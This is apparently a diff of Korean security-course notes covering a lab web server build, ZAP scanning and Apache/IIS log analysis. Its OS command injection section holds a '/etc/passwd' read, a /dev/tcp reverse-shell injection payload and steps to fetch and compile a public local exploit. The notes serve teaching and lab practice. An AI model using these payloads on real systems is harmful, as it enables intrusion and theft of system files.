@@ -129,8 +129,9 @@ service sshd start
 
 ### VPN(Virtual Private Network)
 * 가상사설망
-    - 가짜로 사설망처럼 사용 -> 사실은 공인망을 사설망처럼 사용함 -> 암호화
-
+    
+- 가짜로 사설망처럼 사용 -> 사실은 공인망을 사설망처럼 사용함 -> 암호화
+    
 * 구성방식
     - P2P(또는 Site to Site)
     ```
@@ -229,9 +230,9 @@ cmd> nc.exe -lvp 80
 자료 : 구글공유
  준비 : vmware, 웹서버OS vm, kali vm
  (목요일까지 준비 -> 금요일 수업)
- ```
+```
 
-### 08/27(금요일) 수업 공유 링크
+#### 08/27(금요일) 수업 공유 링크
 * c11.kr/multicampusweblogs
 
 ### IDS/IPS
@@ -378,3 +379,305 @@ gw(fw)에게 win7 ip(1.75) - kali mac를 전달
 	arp talbe	    1.75 =kali
 ```
 * 패킷 캡쳐, ips event 확인
+
+---
+## 아파치 웹서버 로그 확인
+* 웹서버(victim준비)
+	- APM설치 (PHP73, Mariadb, httpd)
+	- phpmyadmin 설치
+
+* kali가 웹서버 공격하여 로그 발생(zap)
+* log확인
+
+### 윈도우 로그
+* IIS 웹서버 로그 확인
+
+1. 웹서버 설정
+```
+@centos
+NIC 1개만 사용 : NAT(또는 vmnet8)
+부팅
+admin (암호 dkagh1.)
+
+고정 IP할당 192.168.10.50/24	gateway : 192.168.10.2  	dns : 192.168.10.2
+
+$ ping 192.168.10.2
+$ nslookup www.naver.com
+$ sudo yum -y update
+```
+
+#### APM
+* apache + PHP + MariaDB(Mysql)
+* phpmyadmin 4.9.5 -> 최소사양확인 필수
+	- https://docs.phpmyadmin.net/_/downloads/en/release_4_9_5/pdf/
+* mariadb 설치10.4
+
+```
+# vi /etc/yum.repos.d/MariaDB.repo
+ 
+#추가
+[mariadb]
+name = MariaDB
+baseurl = http://yum.mariadb.org/10.4/centos7-amd64
+gpgkey = https://yum.mariadb.org/RPM-GPG-KEY-MariaDB
+gpgcheck = 1
+
+$ sudo yum repolist
+$ sudo  yum  install -y MariaDB
+$ sudo systemctl enable mariadb
+$ sudo systemctl start mariadb
+$ sudo /usr/bin/mariadb-secure-installation (보안설정하는 스크립트)
+	초기 root 암호 없음  엔터
+	root 암호 변경 > 2번입력  
+	anonymus사용자를 삭제 할것인지 n
+	root 원격접속 여부  : y
+	test이름의 데이터베이스를 삭제 할것인지. 	y n 
+	저장여부 y
+
+$ sudo mysql -u root  -p 
+	암호 입력
+
+mysql>  show databases;
+mysql> exit
+y
+```
+2. httpd (웹서버 설치)
+```
+$ sudo yum install -y httpd
+```
+
+
+3. php설치 (php73)
+```
+$ sudo yum install http://rpms.remirepo.net/enterprise/remi-release-7.rpm
+$ sudo yum install -y yum-utils
+$ sudo yum-config-manager --disable remi-php54
+$ sudo yum-config-manager --enable remi-php73
+
+$ sudo yum install php73
+$ sudo yum install php73-php.x86_64  php-cli-7.3.8-1.el7.remi.x86_64 php73-scldevel.x86_64 php73-php-xml.x86_64   php73-php-xmlrpc.x86_64   php73-php-soap.x86_64 php73-php-process.x86_64 \
+php73-php-pgsql.x86_64  php73-php-pdo.x86_64  php73-php-opcache.x86_64 php73-php-odbc.x86_64   \
+php73-php-mysqlnd.x86_64 php73-php-mbstring.x86_64 php73-php-ldap.x86_64  \
+php73-php-ldap.x86_64  php73-php-json.x86_64  php73-php-ioncube-loader.x86_64 \
+php73-php-intl.x86_64  php73-php-gmp.x86_64 php73-php-gd.x86_64  php73-php-fpm.x86_64 \
+php73-php-devel.x86_64  php73-php-dba.x86_64  php73-php-common.x86_64 \
+php73-php-cli.x86_64  php73-php-bcmath.x86_64  php73-php-pecl-zip.x86_64 \
+php73-php-phpiredis.x86_64  php73-php-pecl-imagick* php73-php-pecl-igbinary.x86_64 \
+php73-php-pecl-igbinary-devel.x86_64 php73-php-pecl-geoip.x86_64 php73-php-pecl-xdebug.x86_64
+
+
+$ sudo ls /etc/opt/remi/php73/php.ini
+922 date.timezone = “Asia/Seoul”
+
+
+FastCGI Process Manager (FPM) 동작
+
+
+$ sudo systemctl start php73-php-fpm
+( 패키지없는 경우 설치)
+
+$ sudo systemctl start httpd
+$ sudo systemctl enable httpd
+
+웹브라우저에서 test 페이지 확인  (apache)
+php확인
+$ sudo vim /var/www/html/info.php
+	<?php  phpinfo(); ?>
+웹브라우저로 확인 http://localhost/info.php
+```
+
+3. 방화벽 설정 및 웹 관련 설정
+```
+$ sudo firewall-cmd --permanent --zone=public --add-service=http 
+$ sudo firewall-cmd --permanent --zone=public --add-service=https
+$ sudo firewall-cmd --reload
+
+$ wget -P /usr/local/src https://files.phpmyadmin.net/phpMyAdmin/4.9.5/phpMyAdmin-4.9.5-all-languages.zip
+
+$ sudo cd /usr/local/src
+$ sudo unzip phpMyAdmin-4.9.5-all-languages.zip
+$ sudo mv /usr/local/src/phpMyAdmin-4.9.5-all-languages /usr/share/phpMyAdmin  (디렉토리이름변경함께 이동. phpMyAdmin 아래에 바로 index.php 등 파일이 있어야함.)
+
+도메인네임(IP) / phpmyadmin 입력시  /usr/share/phpMyAdmin 연결되도록 설정
+
+$ sudo vim /etc/httpd/conf.d/phpMyAdmin.conf
+===========================================
+Alias /phpMyAdmin /usr/share/phpMyAdmin
+
+<Directory /usr/share/phpMyAdmin/>
+    Require all granted
+</Directory>
+===========================================
+
+---------------------------------------------
+보안설정 ; 
+<Directory /usr/share/phpMyAdmin/>
+    Require all denied
+    Require ip 192.168.0.1  
+</Directory>
+---------------------------------------------
+conf 파일 확인
+$ sudo apachectl configtest
+$ sudo systemctl restart httpd
+
+웹브라우저로 접근해보기.
+
+victim 준비 완료
+
+centos 내에서  http://192.168.10.50 또는 http://localhost 입력시 웹페이지 확인
+ http://localhost/phpMyAdmin 하고 나와야합니다.
+```
+
+
+4. 공격하여 로그 남기기
+* attacker (kali)  NIC - NAT 연결
+	- root 암호 toor
+	- 부팅 후, zap 실행  -> 업데이트 
+
+kali web----proxy(zap)----------------------------------------------centos
+	      8080
+* zap 실행 (프락시)
+	- 브라우저 proxy설정 loalhost 8080
+	- 브라우저에서 접속 공격대상에 접속
+	- 웹브라우저로 방문한 사이트가 목록에 뜸.
+		+ 브라우저 내에 proxy 설정 필요(localhost:8080)
+	- 사이트 목록에서 http://192.168.10.50 선택 -> 공격 클릭
+* 수동으로 sql injection, xss, csrf, 다운로드, 업로드… 직접 해도 됩니다.
+
+5. 로그 확인하기
+* centos 웹서버 로그를 windows로 빼기 (메일 발송 가능)
+* apache log viewer로 로그 보기.  
+	- 툴 : ApacheLogsViewer.exe
+
+```
+apache logs viewer
+https://www.apacheviewer.com/download/
+현재 버전 5.60
+
+메뉴얼
+https://www.apacheviewer.com/httpLogsViewer_Help.pdf
+```
+
+* 침해시스템 (centos) /var/log/httpd/access_log, error_log -> win10으로 전달
+
+
+그외 취약한 웹소스 (오픈 소스 )  
+ 1) bWAPP
+  https://sourceforge.net/projects/bwapp/
+ 2) OWASP broken Web Application Project
+https://www.owasp.org/index.php/OWASP_Broken_Web_Applications_Project
+ 3) DVWA
+ http://www.dvwa.co.uk
+
+
+### IIS 웹서버 로그
+* log parser  (파일명 : LogParser.msi (설치) - 구글 공유)		# CLI 환경
+* log parser studio (GUI-sql)  파일명 : LPSV2.D2.zip		# 'log parser' 설치 필요
+
+* 샘플 로그 (파일 명: W3SVC2.zip - 구글공유에 있음) 
+	- 주의사항 : 압축 해제 시 C:\ 아래에 해주세요. 또는 경로에 한글이 있으면 안됨.
+
+
+#### log parser studio에서 로그파일 불러오기(로그유형 인식 필수)
+
+sql문
+1) 시간순으로 404코드를 카운트하며 그룹화
+```
+select to_string(time,'hh:mm:ss'), count(*)
+from [파일경로=한글안됨]\ex081011.log
+where sc-status = 404
+group by to_string(time, 'hh:mm:ss')
+```
+
+2) 시간순으로 500코드를 카운트하며 그룹화
+```
+select to_string(time,'hh:mm:ss'), count(*)
+from [파일경로=한글안됨]\ex081011.log
+where sc-status = 500
+group by to_string(time, 'hh:mm:ss')
+```
+* 'group by to_string(time, 'hh:mm:ss')'
+	- 선택한 컬럼과 count(*)를 그룹화
+	
+3) 시간순으로 모든 코드를 카운트하며 그룹화
+```
+select to_string(time,'hh:mm:ss'), sc-status, count(*)
+from  [파일경로=한글안됨]\ex081011.log
+group by to_string(time, 'hh:mm:ss'), sc-status
+```
+
+4) 카운트로 내림차순 정령하며, 일정 시간 구간의 404코드를 가진 ip를 그룹화
+```
+select c-ip, count(*)
+ from [파일경로=한글안됨] \ex081011.log
+where sc-status = 404
+and to_string(time, 'hh:mm') >= '02:30'
+and to_string(time, 'hh:mm') <= '07:00'
+group by c-ip
+order by count(*) desc
+```
+* 'order by count(*) desc'
+	- 카운트 순으로 정렬(내림차순)
+5) 카운트로 내림차순 정령하며, 일정 시간 구간의 404코드를 가진 파일이름을 그룹화
+```
+select extract_filename(cs-uri-stem), count(*)
+ from [파일경로=한글안됨] \ex081011.log
+where sc-status = 404
+and to_string(time, 'hh:mm') >= '02:30'
+and to_string(time, 'hh:mm') <= '07:00'
+group by extract_filename(cs-uri-stem)
+order by count(*) desc
+```
+
+---
+# 프로젝트
+
+## 공격을 탐지하는 IDS/IPS 구축
+* 대쉬보드
+	- barnyard(base), splunk(유로), elk
+
+* 공격 유형
+	- OSI 7계층 dos 공격
+---
+### OS Command Injection
+* 웹 어플리케이션이 OS에서 사용하는 명령어를 쉘을 통해서 실행하는 경우, 이 명령어를 조작하여 공격하는 기법.
+* 명령어 연결자
+	- &, &&, |, ||, ;. `
+* &
+	- 앞의 명령어가 백그라운드로 실행되고 뒤의 명령어가 실행
+	- 윈도우의 경우 앞명령어 실행하고 뒷명령어 실행
+	- `& cat /etc/passwd`
+* &&
+	- 앞명령어가 성공하면 뒤명령어 실행
+* |	
+	- 앞명령어의 결과가 뒤명령어의 입력으로 반영되어 실행됨
+* ;	
+	- 앞명령어 실행하고 명령어 실행
+* ||	
+	- 앞의 명령어가 실패해도 뒤의 명령어가 실행됨
+* `
+	- 뒤명령어 우선 실행(리눅스)
+	- Ex) 파라미터 `ls -al`
+
+#### 공격 예시1
+* nc -lvp 4444
+* 127.0.0.1; /bin/sh 0</dev/tcp/192.168.10.50/4444 1>&0 2>&0
+
+#### 추가 공격 예시1
+```
+https://www.exploit-db.com/raw/9542
+cd /tmp
+wget 공격코드
+	- wget이 안되면 'cat << EOF >> test.c' 로 파일 복사 생성
+	- 파일 내용 수정
+		sed -i.bak 's/\/bin\/sh/\$0/' test.c
+		sed -i.bak 's/,%esp\\n/\$4,%esp\\n/' test.c
+		sed -i.bak 's/"$0"/"\/bin\/sh"/' test.c
+gcc -o attack 공격코드
+```
+
+
+---
+## 보안 솔류션 설치
+* pdf 문서 참조
+
